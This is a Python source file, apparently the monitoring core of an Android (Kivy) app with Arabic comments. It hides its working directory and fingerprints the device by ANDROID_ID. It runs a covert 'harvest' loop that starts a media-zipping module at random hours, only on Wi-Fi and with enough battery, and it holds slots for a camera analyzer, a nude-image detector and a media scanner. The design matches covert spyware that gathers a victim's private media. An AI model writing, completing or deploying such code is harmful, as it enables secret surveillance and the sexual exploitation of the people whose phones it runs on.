# -*- coding: utf-8 -*-
import os
import time
import json
import random
import threading
import logging
import gc
import hashlib
from datetime import datetime, timedelta

def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if not os.path.exists(P):
    os.makedirs(P)

logging.basicConfig(
    filename=os.path.join(P, "m.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s [%(levelname)s] %(message)s'
)

try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False

class M:
    def __init__(self):
        self.d = P
        self.cf = os.path.join(self.d, "c.json")
        self.lh = os.path.join(self.d, "lh")
        self.wt = os.path.join(self.d, "wt")

        self.rn = True
        self.did = None
        self.dmd = None
        self.last_mid = 0

        self.ui = None
        self.daily_zipper = None
        self.camera_analyzer = None
        self.nude_detector = None
        self.media_scanner = None
        self.ctrl = None
        self.vlt = None

        # إضافة حدث للنوم العميق
        self._wake_event = threading.Event()

        self._load_config()
        self._get_device_info()
        self._setup()

    def _setup(self):
        try:
            with open(os.path.join(self.d, ".nomedia"), 'w') as f:
                f.write("")
        except:
            pass

    def _load_config(self):
        # تم تغيير الفاصل الافتراضي إلى 900 ثانية (15 دقيقة) بدلاً من 1800
        default_cfg = {
            "hth": 15,
            "wl": False,   # لم نعد بحاجة إلى WAKE_LOCK، نحتفظ بالإعداد للتوافق فقط
            "iv": 900
        }
        if os.path.exists(self.cf):
            try:
                with open(self.cf, 'r') as f:
                    default_cfg.update(json.load(f))
            except:
                pass
        self.cfg = default_cfg

    def _get_ctx(self):
        if not JNI:
            return None
        try:
            return autoclass('org.kivy.android.PythonActivity').mActivity
        except:
            return None

    def _get_device_info(self):
        if JNI:
            try:
                ctx = self._get_ctx()
                Build = autoclass('android.os.Build')
                Secure = autoclass('android.provider.Settings$Secure')
                self.did = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
                self.dmd = f"{Build.MANUFACTURER} {Build.MODEL}"
            except:
                self.did = f"ID_{random.randint(100000, 999999)}"
                self.dmd = "Android_Device"
        else:
            self.did, self.dmd = "DEV_PC", "Linux_System"

    def _is_wifi(self):
        if not JNI:
            return True
        try:
            ctx = self._get_ctx()
            cm = ctx.getSystemService("connectivity")
            ni = cm.getActiveNetworkInfo()
            return ni and ni.isConnected() and ni.getType() == 1
        except:
            return False

    def _battery_ok(self):
        if not JNI:
            return 100, True
        try:
            ctx = self._get_ctx()
            IntentFilter = autoclass('android.content.IntentFilter')
            battery_filter = IntentFilter("android.intent.action.BATTERY_CHANGED")
            battery_status = ctx.registerReceiver(None, battery_filter)
            level = battery_status.getIntExtra("level", -1)
            scale = battery_status.getIntExtra("scale", -1)
            status = battery_status.getIntExtra("status", -1)
            percent = int((level / scale) * 100) if scale > 0 else 50
            is_charging = status in (2, 5)
            return percent, is_charging
        except:
            return 50, False

    def _next_harvest_time(self):
        now = datetime.now()
        delta_hours = random.randint(2, 6)
        delta_minutes = random.randint(0, 59)
        target = now + timedelta(hours=delta_hours, minutes=delta_minutes)
        return target.isoformat()

    def _harvest_logic(self):
        if not self._is_wifi():
            return

        battery, charging = self._battery_ok()
        min_battery = self.cfg.get('hth', 15)
        if battery < min_battery and not charging:
            return

        if os.path.exists(self.wt):
            try:
                with open(self.wt, 'r') as f:
                    next_time_str = f.read().strip()
                    if next_time_str and datetime.now() < datetime.fromisoformat(next_time_str):
                        return
            except:
                pass

        if self.daily_zipper:
            try:
                threading.Thread(target=self.daily_zipper.run, daemon=True).start()
                with open(self.wt, 'w') as f:
                    f.write(self._next_harvest_time())
                with open(self.lh, 'w') as f:
                    f.write(datetime.now().isoformat())
            except Exception as e:
                logging.error(f"Harvest failed: {e}")

        gc.collect()

    def _loop(self):
        # لم نعد نستخدم WAKE_LOCK إطلاقاً
        while self.rn:
            try:
                self._harvest_logic()
            except Exception as e:
                logging.error(f"Monitor loop error: {e}")

            # نوم عميق بدلاً من حلقة 1 ثانية
            interval = self.cfg.get('iv', 900)
            # ينتظر إما انتهاء المهلة أو إشارة الإيقاف
            self._wake_event.wait(interval)

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()
        if self.ui and self.did:
            try:
                self.ui.reg(self.did, self.dmd)
            except Exception as e:
                logging.error(f"Device registration failed: {e}")

    def stop(self):
        self.rn = False
        # إيقاظ الخيط فوراً لإنهاء الحلقة
        self._wake_event.set()


def get_device_tag():
    try:
        Secure = autoclass('android.provider.Settings$Secure')
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        aid = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
        if aid:
            return aid[:8].lower()
    except:
        pass
    try:
        Build = autoclass('android.os.Build')
        model = f"{Build.MANUFACTURER} {Build.MODEL}"
        return hashlib.md5(model.encode()).hexdigest()[:8]
    except:
        return "unknown"
